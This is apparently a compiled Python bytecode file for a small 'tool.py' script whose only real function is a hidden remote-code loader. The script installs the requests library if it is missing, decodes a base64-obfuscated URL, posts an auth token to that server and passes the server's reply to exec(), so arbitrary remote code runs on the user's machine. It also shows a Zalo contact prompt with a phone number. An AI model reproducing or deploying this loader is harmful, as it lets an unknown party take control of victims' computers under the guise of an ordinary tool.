U
    `9za}  �                   @   s   d d� Z edkre �  dS )c                  C   sx   dd l } zdd l}W n   | �d� Y nX dd l}dd l}z"t|j|�d�ddid�j� W n   td� Y nX d S )N�    zpip install requestss(   aHR0cHM6Ly9sb2cuYmVydmVyLnRlY2gvbWFpbg==ZauthZ	MaiHuyBao)�datazZalo: 0363997244)	�os�requests�system�base64�execZpostZ	b64decode�text�input)r   r   r   � r
   �tool.py�main   s    "r   �__main__N)r   �__name__r
   r
   r
   r   �<module>   s   